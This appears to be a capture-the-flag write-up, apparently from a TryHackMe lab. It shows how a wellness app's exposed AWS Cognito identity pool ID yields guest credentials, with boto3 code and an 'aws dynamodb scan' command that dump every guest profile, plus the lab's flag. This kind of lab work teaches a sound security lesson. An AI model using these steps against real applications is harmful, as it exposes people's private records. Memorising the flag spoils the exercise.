### summary

#### 1\. Reconnaissance

I visited the wellness app URL and examined the source code.

Found:

-   The app uses AWS Cognito for authentication

-   No login screen: it assigns guest credentials automatically

-   JavaScript file `app.js` contained the keys

#### 2\. Extracted Credentials

From `app.js`:

```javascript

const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

#### 3\. Generated AWS Credentials

Used the Cognito Identity Pool ID to get temporary AWS credentials via `boto3`:

```python

client = boto3.client('cognito-identity', region_name='us-east-1')
identity_id = client.get_id(IdentityPoolId=IDENTITY_POOL_ID)['IdentityId']
creds = client.get_credentials_for_identity(IdentityId=identity_id)['Credentials']
```

#### 4\. Dumped DynamoDB Table

Used the temporary credentials to scan the DynamoDB table:

```bash

aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```

#### 5\. Found the Flag

The table contained multiple guest records. One VIP guest (`guest-vip-042`) had the flag in their notes:

```json

{
 "guest_id": {"S": "guest-vip-042"},
 "name": {"S": "Guest VIP-042"},
 "notes": {"S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"}
}
```
